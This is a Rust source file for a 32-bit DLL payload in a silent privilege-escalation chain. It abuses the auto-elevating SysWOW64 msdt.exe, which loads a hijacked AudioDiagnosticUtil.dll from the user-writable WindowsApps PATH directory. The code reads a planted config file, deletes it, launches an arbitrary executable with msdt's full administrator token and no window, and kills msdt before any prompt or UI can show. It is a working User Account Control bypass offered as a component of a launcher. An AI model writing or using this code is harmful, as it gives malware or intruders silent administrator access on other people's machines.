//! x86 DLL payload for the msdt silent-elevation path of the launcher.
//!
//! `c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\AudioRecordingDiagnostic.xml -skip yes`
//! is an auto-elevate binary, and the 32-bit one resolves `AudioDiagnosticUtil.dll`
//! through `PATH`. The default per-user `PATH` ends with `%LOCALAPPDATA%\Microsoft\
//! WindowsApps`, a user-writable directory, so the launcher drops this DLL there plus a
//! sibling `.cfg` carrying what to start. The elevated msdt loads the DLL, which spawns
//! the configured executable (inheriting msdt's full administrator token) and then
//! kills msdt before any UI can appear.
//!
//! Built for `i686-pc-windows-msvc` only: the SysWOW64 msdt.exe is a 32-bit process and
//! cannot load a 64-bit DLL. Everything is declared by hand so the crate builds with no
//! dependencies.

#![cfg(target_os = "windows")]

use std::{ffi::c_void, os::windows::ffi::OsStrExt, ptr::null_mut};

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS: u32 = 0x0000_0004;
const GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT: u32 = 0x0000_0002;

/// Sibling of the dropped DLL, written by the launcher: log path, exe path, parameters,
/// one per line.
const CFG_NAME: &str = "AudioDiagnosticUtil.cfg";

#[allow(dead_code)]
#[repr(C)]
struct StartupInfoW {
    cb: u32,
    reserved: *mut u16,
    desktop: *mut u16,
    title: *mut u16,
    x: u32,
    y: u32,
    x_size: u32,
    y_size: u32,
    x_count_chars: u32,
    y_count_chars: u32,
    fill_attribute: u32,
    flags: u32,
    show_window: u16,
    cb_reserved2: u16,
    reserved2: *mut u8,
    std_input: *mut c_void,
    std_output: *mut c_void,
    std_error: *mut c_void,
}

#[allow(dead_code)]
#[repr(C)]
struct ProcessInformation {
    process: *mut c_void,
    thread: *mut c_void,
    process_id: u32,
    thread_id: u32,
}

#[link(name = "kernel32")]
extern "system" {
    fn GetModuleHandleExW(flags: u32, name: *const u16, module: *mut *mut c_void) -> i32;
    fn GetModuleFileNameW(module: *mut c_void, filename: *mut u16, size: u32) -> u32;
    fn CreateProcessW(
        app_name: *const u16,
        command_line: *mut u16,
        process_attributes: *mut c_void,
        thread_attributes: *mut c_void,
        inherit_handles: i32,
        creation_flags: u32,
        environment: *mut c_void,
        current_directory: *const u16,
        startup_info: *mut StartupInfoW,
        process_information: *mut ProcessInformation,
    ) -> i32;
    fn GetLastError() -> u32;
    fn CloseHandle(handle: *mut c_void) -> i32;
    fn ExitProcess(code: u32) -> !;
}

/// Entry point. This is a CRT initializer rather than `DllMain` on purpose: on 32-bit
/// MSVC a `#[no_mangle]` stdcall function is exported undecorated (`DllMain`), while
/// the CRT startup references `_DllMain@12`, so a `no_mangle` DllMain would silently
/// never be called for the only target this crate builds for. A function pointer in
/// `.CRT$XCU` is arch-neutral and is walked by the CRT during `DLL_PROCESS_ATTACH`
/// (same loader-lock constraints as `DllMain`).
#[used]
#[link_section = ".CRT$XCU"]
static ATTACH: unsafe extern "C" fn() = attach;

unsafe extern "C" fn attach() {
    // A CRT initializer receives no module handle, so recover this DLL's own from a
    // static's address (passing null to `GetModuleFileNameW` would yield msdt.exe).
    let mut module: *mut c_void = null_mut();
    if GetModuleHandleExW(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        &ATTACH as *const _ as *const u16,
        &mut module,
    ) != 0
    {
        run(module);
    }
    // msdt must never reach its UI, whether the spawn worked or not: the launcher
    // notices a missing spawn through its own timeout and cleans the drop up.
    ExitProcess(0);
}

/// Reads the launch parameters from the sibling `.cfg`, spawns the configured
/// executable and reports the outcome to the launcher's log.
///
/// Runs under the loader lock, so it stays on the `kernel32` calls the reference PoC
/// uses: file reads and one `CreateProcessW`, nothing that loads a DLL.
unsafe fn run(module: *mut c_void) {
    let mut name = [0u16; 512];
    let len = GetModuleFileNameW(module, name.as_mut_ptr(), name.len() as u32) as usize;
    if len == 0 || len >= name.len() {
        return;
    }
    let dll_path = std::path::PathBuf::from(String::from_utf16_lossy(&name[..len]));
    let Some(dir) = dll_path.parent() else {
        return;
    };
    let cfg_path = dir.join(CFG_NAME);
    let Ok(text) = std::fs::read_to_string(&cfg_path) else {
        return;
    };
    // Consume the parameters exactly once: a second load of this DLL (another msdt, a
    // stray scan) finds no `.cfg` and does nothing. The launcher rewrites it per attempt.
    let _ = std::fs::remove_file(&cfg_path);
    let mut lines = text.lines();
    let (Some(log_path), Some(exe), Some(params)) = (lines.next(), lines.next(), lines.next())
    else {
        return;
    };
    let mut cmdline: Vec<u16> = format!("\"{}\" {}", exe, params)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let mut si: StartupInfoW = std::mem::zeroed();
    si.cb = std::mem::size_of::<StartupInfoW>() as u32;
    let mut pi: ProcessInformation = std::mem::zeroed();
    let ok = CreateProcessW(
        std::ptr::null(),
        cmdline.as_mut_ptr(),
        null_mut(),
        null_mut(),
        0,
        CREATE_NO_WINDOW,
        null_mut(),
        std::ptr::null(),
        &mut si,
        &mut pi,
    );
    let gle = if ok == 0 { GetLastError() } else { 0 };
    log(
        log_path,
        &format!(
            "msdt-dll: CreateProcessW ok={} pid={} gle={}",
            ok, pi.process_id, gle
        ),
    );
    if ok != 0 {
        let _ = CloseHandle(pi.thread);
        let _ = CloseHandle(pi.process);
    }
}

fn log(path: &str, message: &str) {
    use std::io::Write;
    if let Ok(mut file) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
    {
        let _ = writeln!(file, "{}", message);
    }
}
